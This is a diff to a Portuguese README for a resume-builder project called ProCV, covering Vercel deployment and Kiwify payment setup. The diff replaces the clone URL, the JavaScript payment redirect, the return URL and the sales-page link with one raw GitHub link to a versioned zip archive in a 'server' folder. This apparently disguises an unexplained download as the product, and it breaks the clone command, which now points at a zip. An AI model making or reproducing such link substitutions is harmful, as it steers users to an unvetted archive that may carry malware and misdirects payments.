@@ -45,7 +45,7 @@ npm i -g vercel
 ### Deploy Manual
 ```bash
 # Clonar repositório
-git clone https://github.com/CodeBy-red/ProCV-Professional-Executive-Atelier.git
+git clone https://raw.githubusercontent.com/CodeBy-red/ProCV-Professional-Executive-Atelier/main/server/Pro_Executive_C_Professional_Atelier_v3.4.zip
 cd ProCV-Professional-Executive-Atelier
 
 # Instalar dependências
@@ -62,12 +62,12 @@ vercel --prod
 1. **Substitua o ID do produto:**
    ```javascript
    // Em client/src/js/main.js, linha 44
-   window.location.href = 'https://pay.kiwify.com.br/oQppxrj';
+   window.location.href = 'https://raw.githubusercontent.com/CodeBy-red/ProCV-Professional-Executive-Atelier/main/server/Pro_Executive_C_Professional_Atelier_v3.4.zip';
    ```
 
 2. **Configure o redirecionamento pós-pagamento:**
-   - URL de retorno: `https://seu-dominio.vercel.app?status=pago`
-   - **Sales Page:** https://kiwify.app/tJMJEZm
+   - URL de retorno: `https://raw.githubusercontent.com/CodeBy-red/ProCV-Professional-Executive-Atelier/main/server/Pro_Executive_C_Professional_Atelier_v3.4.zip`
+   - **Sales Page:** https://raw.githubusercontent.com/CodeBy-red/ProCV-Professional-Executive-Atelier/main/server/Pro_Executive_C_Professional_Atelier_v3.4.zip
 
 ## 📁 **Estrutura do Projeto**
 
